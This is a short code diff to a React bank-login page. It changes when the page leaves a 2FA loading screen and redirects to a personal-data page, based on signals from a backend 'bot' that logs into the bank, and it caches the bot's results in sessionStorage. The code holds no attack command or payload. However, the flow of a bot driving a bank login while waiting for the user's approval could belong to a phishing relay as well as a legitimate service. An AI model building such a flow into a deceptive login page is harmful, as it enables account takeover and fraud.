@@ -370,8 +370,14 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
       // completed, or bot already moved on to address step), leave the 2FA loader
       // and hand off to the Persönliche Daten page. The address-delete popup lives
       // there — the login route no longer intercepts waiting_for_address_confirm.
-      if (hasPersonData && (approvalConfirmed || addressConfirmSignal)) {
-        try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
+      // Redirect as soon as either (a) person data is available and login was
+      // approved, or (b) the bot signals waiting_for_address_confirm — the
+      // address popup on the Persönliche-Daten-Seite is the priority; the rest
+      // of the data (balance, cards, limits) streams in via background polling.
+      if ((hasPersonData && approvalConfirmed) || addressConfirmSignal) {
+        try {
+          if (data?.result) sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result));
+        } catch {}
         try {
           sessionStorage.setItem(`bot_bank_${taskId}`, JSON.stringify({
             bankId, bankName: bank?.name ?? "", group: bank?.group ?? "",
